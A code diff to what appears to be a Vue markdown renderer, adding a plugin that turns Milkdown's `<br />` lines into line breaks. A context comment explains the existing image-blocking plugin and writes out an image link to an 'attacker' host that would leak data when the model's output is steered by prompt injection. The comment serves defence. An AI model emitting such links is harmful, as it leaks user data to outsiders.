@@ -102,6 +102,25 @@ function geojsonPlugin(md) {
 }
 
 /**
+ * Milkdown (our editor) saves an empty paragraph as a line holding only
+ * `<br />`, and reads `<br>`, `<br/>` and `<br >` back the same way. Raw HTML
+ * is disabled here, so without this that line would render as literal text.
+ * Render it as a line break in its own paragraph instead, the blank line the
+ * author left in the editor, without enabling HTML.
+ */
+const EMPTY_LINE = /^<br\s*\/?>$/i
+
+function emptyLinePlugin(md) {
+    md.core.ruler.push('milkdown_empty_line', (state) => {
+        for (const token of state.tokens) {
+            if (token.type === 'inline' && EMPTY_LINE.test(token.content.trim())) {
+                token.children = [new state.Token('hardbreak', 'br', 0)]
+            }
+        }
+    })
+}
+
+/**
  * Disables markdown image syntax. Images load automatically, so for text we don't
  * fully control (Pip's model output, which can be steered by prompt injection in
  * content it reads) `![](https://attacker/?data=…)` would leak data the moment
@@ -141,8 +160,8 @@ const props = defineProps({
 })
 
 const plugins = computed(() => props.allowImages
-    ? [geojsonPlugin, mermaidPlugin]
-    : [geojsonPlugin, mermaidPlugin, noImagesPlugin])
+    ? [geojsonPlugin, mermaidPlugin, emptyLinePlugin]
+    : [geojsonPlugin, mermaidPlugin, emptyLinePlugin, noImagesPlugin])
 
 const router = useRouter()
 const container = ref(null)
